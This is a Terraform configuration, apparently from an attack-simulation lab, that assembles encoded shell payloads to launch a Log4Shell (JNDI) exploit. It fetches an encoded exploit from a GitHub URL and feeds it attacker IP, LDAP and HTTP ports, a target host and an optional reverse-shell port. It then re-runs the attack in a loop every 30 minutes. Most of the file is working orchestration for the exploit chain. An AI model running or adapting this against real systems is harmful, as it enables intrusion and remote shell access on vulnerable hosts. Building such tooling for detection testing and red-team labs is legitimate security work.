locals {
    attack_dir = "/jndiexploit"
    attack_script = "jndiexploit.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_log4shell.lock"
    jndiexploit_url="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
    image = "openjdk:11"
    name = "jndiexploit"
    exec_type = var.inputs["reverse_shell"] == true ? "ReverseShell" : "Basic/Command/Base64"

    # only base64 encode the payload if we are executing a command
    base64_log4shell_payload= var.inputs["reverse_shell"] == true ? var.inputs["payload"] : base64encode(
       var.inputs["payload"]
    )
    payload = <<-EOT
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "removing previous app directory"
        docker stop ${local.name}
        rm -rf ${local.attack_dir}
        log "creating app directory"
        mkdir -p ${local.attack_dir}
        cd ${local.attack_dir}
        echo ${local.jdniexploit} | base64 -d > ${local.attack_script}
        echo ${local.delayed_start} | base64 -d > ${local.start_script}

        log "starting script..."
        /bin/bash ${local.start_script}
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
        fi
    done
    log "Done."
    EOT
    
    jdniexploit              = base64encode(templatefile(
                                "${path.module}/resources/${local.attack_script}",
                                {
                                    jndiexploit_url     = local.jndiexploit_url
                                    image               = local.image
                                    name                = local.name
                                    attacker_ip         = var.inputs["attacker_ip"]
                                    attacker_http_port  = var.inputs["attacker_http_port"]
                                    attacker_ldap_port  = var.inputs["attacker_ldap_port"]
                                    target_ip           = var.inputs["target_ip"]
                                    target_port         = var.inputs["target_port"]
                                    exec_type           = local.exec_type
                                    base64_payload      = urlencode(local.base64_log4shell_payload)
                                    reverse_shell_port  = var.inputs["reverse_shell_port"]
                                }
                        ))
    delayed_start              = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    lock_file = local.lock_file
                                    attack_delay = var.inputs["attack_delay"]
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))

    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        apt_packages = "git"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        yum_packages = "git"
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}